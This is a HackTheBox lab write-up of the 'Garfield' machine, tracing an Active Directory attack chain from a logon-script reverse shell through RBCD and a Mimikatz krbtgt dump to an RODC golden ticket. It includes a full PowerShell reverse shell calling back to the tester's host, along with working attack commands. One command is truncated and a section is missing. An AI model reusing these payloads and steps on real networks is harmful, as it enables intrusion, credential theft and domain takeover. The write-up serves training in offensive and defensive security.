01 - Environment & Scope

Environment & Scope

Garfield is a Hard-rated HackTheBox machine. The environment is a Windows Active Directory domain with two domain controllers: DC01, the primary writable DC exposed externally, and RODC01, a Read-Only Domain Controller sitting on a segregated internal subnet only reachable through DC01.

DC01 10.129.x.x / 192.168.100.1 Primary Domain Controller Windows Server 2019
RODC01 192.168.100.2 Read-Only Domain Controller Windows Server 2019
Clock Skew DC01 ran with a +8h offset from Kali throughout the engagement. Every Kerberos operation required faketime "$DC_TIME" as a prefix where DC_TIME=$(ntpdate -q <dc-ip> | awk '{print $1, $2}' | head -1), or the KDC would reject tickets with KRB_AP_ERR_SKEW.

02 - Enumeration & ACL Discovery

Enumeration & ACL Discovery

What pointed us here We were given credentials for j.arbuckle from the start. The first priority was understanding what those credentials unlocked in terms of AD objects, group memberships, and ACL edges - not running exploits blind.

Initial SMB enumeration confirmed DC01 as the domain controller for garfield.htb, with SMB signing enforced (killing relay attacks immediately) and no writable shares beyond IPC$. BloodHound collection via bloodhound-python gave us the AD graph. 

# Confirm creds, grab DC metadata
nxc smb 10.129.x.x -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'

# Collect BloodHound data
bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
    -d garfield.htb -ns 10.129.x.x -c All

Key objects found: users j.arbuckle, l.wilson, l.wilson_adm, and krbtgt_8245 (the RODC-specific KDC account). Custom groups: IT Support (j.arbuckle only), Tier 1 (l.wilson_adm only), RODC Administrators (empty). Two computers: DC01 and RODC01. The RODC had its own IP on the internal segment, discovered via DNS: 

nslookup RODC01.garfield.htb 10.129.x.x
Name: RODC01.garfield.htb
Address: 192.168.100.2

The GPO security template in SYSVOL revealed two critical policy settings:

LockoutBadCount 0 No account lockout - password spray freely
PasswordComplexity 0 Passwords can be simple

ACL enumeration via impacket-dacledit on key objects revealed two pivotal edges:

These four ACEs defined the entire path to the user flag. j.arbuckle (IT Support) could write the logon script path on any user. l.wilson could force-reset l.wilson_adm's password. l.wilson_adm (Tier 1) could add herself to RODC Administrators.

03 - Initial Foothold

scriptPath Abuse via SYSVOL Write → Shell as l.wilson

What pointed us here IT Support had WriteProperty on the scriptPath LDAP attribute for all user objects. The scriptPath attribute defines the logon script a user runs at interactive login. If we could write a malicious script and point a simulated active user at it, we'd get code execution as that user.

Two subtle constraints made the naive approach fail before we found the correct path:

  • Outbound SMB is firewalled. Setting scriptPath to a UNC path pointing back to Kali (\\10.10.16.90\share\evil.bat) never triggered because port 445 egress from DC01 was blocked. Responder caught nothing.
  • NETLOGON root is not writable. smbclient --put-file against the NETLOGON share root returned NT_STATUS_ACCESS_DENIED.

The key insight: SYSVOL\garfield.htb\scripts\ - the scripts subdirectory - had different ACLs and was writable with j.arbuckle's credentials. And when scriptPath is set to a bare filename rather than a UNC path, Windows resolves it locally against \\domain\NETLOGON\ which maps to that same scripts directory. No outbound connection required - the DC executes the script from its own filesystem.

# Generate reverse shell payload - encode to avoid character issues in .bat
cat > Invoke-PowerShellTcpOneLine.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.90',4445);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()};$client.Close()
EOF

B64=$(cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0)
echo "powershell -e $B64" > printerDetect.bat

# Upload malicious bat to the writable scripts subdirectory
nxc smb 10.129.x.x \
    -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
    --share SYSVOL \
    --put-file printerDetect.bat 'garfield.htb/scripts/printerDetect.bat'

[+] Created file printerDetect.bat on \\SYSVOL\garfield.htb/scripts/printerDetect.bat

# Set l.wilson's scriptPath to the relative filename - DC resolves it locally
bloodyAD --host 10.129.x.x -d garfield.htb \
    -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
    set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' \
    scriptPath -v 'printerDetect.bat'

[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
# Listener - shell arrived within ~60 seconds
nc -lvnp 4445

connect to [10.10.16.90] from (UNKNOWN) [10.129.x.x]
PS C:\Windows\system32> whoami
garfield\l.wilson
Why relative path, not UNC A UNC scriptPath like \\10.10.16.90\share\evil.bat requires the DC to initiate an outbound SMB connection to Kali - which was firewalled. A relative path like printerDetect.bat tells Windows to look in \\garfield.htb\NETLOGON\printerDetect.bat - a loopback resolution that stays entirely on the DC. No egress required.
04 - Lateral Movement

ForceChangePassword → l.wilson_adm + User Flag

What pointed us here ACL enumeration had already shown l.wilson holds User-Force-Change-Password on l.wilson_adm. This extended right allows resetting another account's password without knowing the current one. We had a shell as l.wilson. The path to l.wilson_adm was one PowerShell command. 
# From the l.wilson reverse shell
$newPass = ConvertTo-SecureString 'REDACTED_LWILSON_ADM_PASSWORD' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newPass -Reset
# Verify from Kali
nxc smb 10.129.x.x -u 'l.wilson_adm' -p 'REDACTED_LWILSON_ADM_PASSWORD' -d garfield.htb
SMB  10.129.x.x  445  DC01  [+] garfield.htb\l.wilson_adm:REDACTED_LWILSON_ADM_PASSWORD

# Open WinRM shell
evil-winrm -i 10.129.x.x -u 'l.wilson_adm' -p 'REDACTED_LWILSON_ADM_PASSWORD'
# User flag
type C:\Users\l.wilson_adm\Desktop\user.txt
REDACTED_USER_FLAG

l.wilson_adm was a member of Tier 1 - a custom group with one non-obvious privilege: the Self-Membership ACE on RODC Administrators. This was the next link in the chain.

05 - Privilege Escalation Setup

Tier 1 Self-Membership → RODC Administrators

What pointed us here ACE[0] on the RODC Administrators group had object type GUID bf9679c0 - Self-Membership - granted to Tier 1. This specific right means members of Tier 1 can add themselves to RODC Administrators without any additional write permissions on the group. l.wilson_adm was in Tier 1. 
# Self-add via the Tier 1 Self-Membership ACE
Add-ADGroupMember -Identity 'RODC Administrators' -Members 'l.wilson_adm'

# Confirm
Get-ADGroupMember 'RODC Administrators'
SamAccountName : l.wilson_adm

Membership in RODC Administrators grants local administrative rights on the RODC01 machine, and write access to specific RODC management attributes on the RODC01 computer object, including msDS-RevealOnDemandGroup (the Password Replication Policy allowed list) and msDS-NeverRevealGroup.

06 - Tunneling & SYSTEM on RODC01

Ligolo-ng Tunnel + RBCD → SYSTEM on RODC01

What pointed us here RODC01 sat at 192.168.100.2 - unreachable directly from Kali. We needed a proper L3 tunnel through DC01 rather than a SOCKS proxy, because SOCKS can only forward initiated connections outbound, while we needed true bidirectional routing to run Impacket tools directly against the internal IP. 
# Kali - set up the Ligolo TUN interface and proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# DC01 via Evil-WinRM - upload and connect the agent
upload agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect 10.10.16.90:11601 -ignore-cert

# Ligolo console - start the session
» session
» start

# Route the internal subnet through the tunnel
sudo ip route add 192.168.100.0/24 dev ligolo

With native L3 connectivity to 192.168.100.2, we proceeded with a Resource-Based Constrained Delegation (RBCD) attack against RODC01. The domain's ms-DS-MachineAccountQuota was 10, meaning any authenticated user could create machine accounts. We created one, set RBCD on RODC01, and impersonated Administrator via S4U2Proxy. 

# Create a controlled machine account
faketime "$DC_TIME" impacket-addcomputer \
    -computer-name 'FAKEBOX$' \
    -computer-pass 'REDACTED_FAKEBOX_PASSWORD' \
    -dc-ip 10.129.x.x \
    'garfield.htb/l.wilson_adm:REDACTED_LWILSON_ADM_PASSWORD'

[*] Successfully added machine account FAKEBOX$ with password REDACTED_FAKEBOX_PASSWORD

# Set RBCD: FAKEBOX$ can impersonate any user to RODC01
faketime "$DC_TIME" impacket-rbcd \
    -delegate-to 'RODC01$' \
    -delegate-from 'FAKEBOX$' \
    -action write \
    -dc-ip 10.129.x.x \
    'garfield.htb/l.wilson_adm:REDACTED_LWILSON_ADM_PASSWORD'

[*] FAKEBOX$ can now impersonate users on RODC01$ via S4U2Proxy

# Request a service ticket impersonating Administrator to RODC01
faketime "$DC_TIME" impacket-getST \
    -spn 'cifs/RODC01.garfield.htb' \
    -impersonate Administrator \
    -dc-ip 10.129.x.x \
    'garfield.htb/FAKEBOX$:REDACTED_FAKEBOX_PASSWORD'

export KRB5CCNAME="/home/kali/htb/GARFIELD/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache"

# SYSTEM shell on RODC01
faketime "$DC_TIME" impacket-psexec \
    -k -no-pass \
    'garfield.htb/Administrator@RODC01.garfield.htb'

07 - Credential Access

Mimikatz → krbtgt_8245 Dump

What pointed us here An RODC stores its own Kerberos key in LSA - specifically the krbtgt_8245 account (the RODC's unique KDC service account). With SYSTEM on RODC01 we could inject directly into LSA memory and extract it. This key is the foundation of the RODC Golden Ticket attack.

Several dump methods failed from the WinRM session (medium integrity, no SeDebugPrivilege). The psexec SYSTEM shell had full token privileges, making privilege::debug succeed. 

# From SYSTEM psexec shell on RODC01
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"

mimikatz(commandline) # privilege::debug
Privilege '20' OK

Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : REDACTED_RODC_KRBTGT_NTLM_HASH

 * Kerberos-Newer-Keys
    aes256_hmac (4096) : REDACTED_RODC_KRBTGT_AES256_KEY
Why krbtgt_8245 specifically Each RODC in an AD forest has its own unique KDC service account. The number in the name (8245) is the RODC's key version identifier. Tickets signed with this account's key can only be validated by the RODC itself - or forwarded to DC01 if the PAC passes the RODC's PRP validation. This asymmetry is the core of the RODC Golden Ticket attack surface.
08 - Privilege Escalation

RODC Golden Ticket → Domain Admin

What pointed us here With the krbtgt_8245 AES256 key we could forge a TGT signed by the RODC's krbtgt. When DC01 receives a TGS-REQ backed by an RODC-signed TGT, it validates the ticket and issues service tickets - provided the requesting user is not blocked by the Password Replication Policy. The attack required three prerequisites: Rubeus v2.3.3+ (earlier versions did not correctly build the RODC PAC), the user must be in msDS-RevealOnDemandGroup on the RODC, and must not be in any Denied group.

Password Replication Policy preparation

We targeted l.wilson_adm instead of Administrator because Domain Admins is in the Denied RODC PRP group by default. Tickets for any member of a denied group are revoked by DC01 at TGS-REQ time. We added l.wilson_adm to msDS-RevealOnDemandGroup on RODC01 directly via LDAP - an operation permitted because l.wilson_adm was in RODC Administrators. 

cat > add_prp.ldif << 'EOF'
dn: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
changetype: modify
add: msDS-RevealOnDemandGroup
msDS-RevealOnDemandGroup: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
EOF

ldapmodify -x \
    -H ldap://10.129.x.x \
    -D 'l.wilson_adm@garfield.htb' \
    -w 'REDACTED_LWILSON_ADM_PASSWORD' \
    -f add_prp.ldif

modifying entry "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb"

Forge the RODC Golden Ticket

Rubeus v2.3.3 correctly constructs the RODC PAC fields required for DC01 to accept the ticket. Earlier versions produced tickets that failed PAC integrity checks.

# From RODC01 - forge TGT for l.wilson_adm with DA groups in PAC
.\Rubeus_sharp.exe golden \
    /rodcNumber:8245 \
    /aes256:REDACTED_RODC_KRBTGT_AES256_KEY \
    /user:l.wilson_adm \
    /id:3107 \
    /domain:garfield.htb \
    /sid:S-1-5-21-2502726253-3859040611-225969357 \
    /groups:512,519,518,516,520 \
    /nowrap

[*] Forged a TGT for 'l.wilson_adm@garfield.htb'
[*] base64(ticket.kirbi): doIFiDCC...

# Request CIFS service ticket from DC01 using the forged TGT
.\Rubeus_sharp.exe asktgs \
    /ticket:<base64> \
    /service:"cifs/DC01.garfield.htb" \
    /dc:10.129.x.x \
    /ptt /nowrap

[+] TGS request successful!
[+] Ticket successfully imported!

Convert and use from Kali

# Download the kirbi, convert to ccache
faketime "$DC_TIME" impacket-ticketConverter admin.kirbi admin.ccache
export KRB5CCNAME="/home/kali/htb/GARFIELD/admin.ccache"

    -k -no-pass \

10 - Lessons

Key Takeaways

Concept Lesson
scriptPath + SYSVOL WriteProperty on scriptPath is a code execution primitive when the SYSVOL scripts directory is writable. A relative path value avoids all outbound network requirements - the DC resolves it locally. Always check SYSVOL subdirectory permissions separately from the root share.
Egress filtering Before spending hours on UNC-based hash capture, verify outbound connectivity with tcpdump -i tun0 src <target>. If port 445 is blocked, pivot to SYSVOL-local script execution or abandon hash capture entirely.
Self-Membership ACE The GUID bf9679c0 (Self-Membership) on a group object means members of the trustee group can add themselves - not others - to the target group. BloodHound does not always surface this as an AddSelf edge; raw dacledit output is the reliable check.
RODC architecture RODCs are not just passive caches. They hold their own krbtgt_N account, manage a Password Replication Policy independently, and run a local NTDS.dit. Compromising an RODC gives you the keys to forge RODC-signed tickets for any user the PRP allows.
RODC Golden Ticket constraints DC01 will revoke an RODC-forged ticket if the target user is a member of any group listed in msDS-NeverRevealGroup. Domain Admins is in this list by default. Target non-admin accounts and forge DA group SIDs into the PAC instead - DC01 validates PRP membership but not PAC group contents.
Rubeus version matters RODC Golden Ticket construction requires Rubeus v2.3.3+. Earlier versions do not correctly build the RODC-specific PAC fields, resulting in KRB_AP_ERR_BAD_INTEGRITY at TGS-REQ time regardless of key correctness.
RBCD on RODCs RODC Administrators grants write access to the RODC computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This makes RBCD a clean SYSTEM path without requiring any share write access - which RODCs typically restrict.
Mimikatz integrity level WinRM sessions run at medium integrity. privilege::debug and LSA injection both require high integrity or SYSTEM. A psexec SYSTEM shell is the reliable way to unlock full Mimikatz capability on a Windows target.
